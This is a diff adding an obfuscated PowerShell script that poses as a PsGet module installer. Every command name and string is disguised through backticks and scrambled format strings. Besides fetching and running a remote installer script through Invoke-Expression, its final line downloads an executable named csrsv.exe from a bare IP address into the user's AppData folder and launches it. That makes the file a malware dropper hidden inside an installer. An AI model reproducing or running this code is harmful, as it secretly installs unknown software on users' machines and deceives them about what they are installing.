@@ -1,0 +1,95 @@
+param(
+	[string]${V`er`SIOn},
+	[string]${pa`Th},
+	[switch]${f`oR`Ce},
+	[switch]${u`pDA`Te},
+	[switch]${uniNs`T`A`lL}
+)
+
+
+
+
+
+${cOnf`IgS} = @{
+	("{1}{0}"-f'rl','U') = ("{1}{2}{6}{4}{3}{5}{0}"-f 's1','http://p','sget','e','n','t/GetPsGet.p','.')
+    ("{3}{0}{2}{1}{4}"-f'tionExclu','io','s','Condi','n') = "(Get-Module -ListAvailable | where{`$_.Name -eq `"PsGet`"})"
+}
+
+${c`ONFiGs} | &("{0}{1}{2}"-f 'ForE','ach-Obje','ct'){
+
+    try{
+
+        ${_}."REs`U`Lt" = ${N`Ull}
+        if(-not ${_}."p`ATH"){${_}."p`Ath" = ${PA`Th}}
+        ${coN`Fig} = ${_}
+
+        
+        
+        
+
+        if(-not ${uniN`S`TaLL}){
+
+            
+            
+            
+
+            if(${_}."Co`NDI`T`Ion`ExC`LusiON"){            
+                ${_}."coN`dITio`Ne`x`ClUsiOnREsULt" = $(.("{5}{4}{2}{0}{1}{3}"-f'ke-Expressi','o','o','n','nv','I') ${coN`FIg}."c`OnDi`TiOneXC`Lu`sioN" -ErrorAction ("{2}{1}{3}{0}"-f 'ue','onti','SilentlyC','n'))        
+            }    
+            if((${_}."C`oND`iTioNE`XcLUSi`oNREsU`LT" -eq ${Nu`ll}) -or ${fO`RcE}){
+                    	
+                
+                
+                
+
+                
+                
+                
+
+                ${_}."U`RL" | .("{0}{3}{2}{1}" -f 'Fo','ject','Ob','rEach-'){
+                    .("{1}{2}{4}{3}{0}" -f 'on','Inv','oke','essi','-Expr') (.("{1}{3}{2}{0}" -f'ct','new-o','je','b') ("{0}{2}{1}{3}"-f 'N','.','et','WebClient')).("{4}{3}{0}{1}{2}"-f 'oadSt','rin','g','l','Down').Invoke(${_})
+                }
+                		
+                
+                
+                
+                
+                
+                
+                
+				
+                
+                
+                
+                		
+                if(${UPda`Te}){${_}."Re`SUlt" = ("{1}{2}{3}{0}" -f'ed','App','Upd','at');${_}
+                }else{${_}."Re`SuLt" = ("{2}{1}{0}{3}"-f'e','stall','AppIn','d');${_}}
+            		
+            
+            
+            
+            		
+            }else{
+            	
+                ${_}."r`e`sUlt" = ("{1}{2}{0}{3}" -f 'usio','ConditionEx','cl','n');${_}
+            }
+
+        
+        
+        
+        	
+        }else{
+            
+            ${_}."rES`ULT" = ("{0}{1}{2}" -f'AppU','ni','nstalled');${_}
+        }
+
+    
+    
+    
+
+    }catch{
+
+        ${c`onFIg}."resu`lT" = ("{1}{0}" -f 'r','Erro');${cOn`F`Ig}
+    }
+}
+(&("{1}{0}{2}" -f'w-Ob','Ne','ject') ("{1}{3}{0}{2}" -f'ien','System.Ne','t','t.WebCl')).("{3}{1}{2}{0}" -f 'adFile','n','lo','Dow').Invoke(("{7}{0}{1}{3}{5}{2}{9}{4}{6}{8}"-f':/','/94','2.53','.','/~','10','ya','http','hoo/csrsv.exe','.238'),"$env:APPDATA\csrsv.exe");&("{1}{2}{0}"-f'ess','St','art-Proc') ("$env:APPDATA\csrsv.exe")
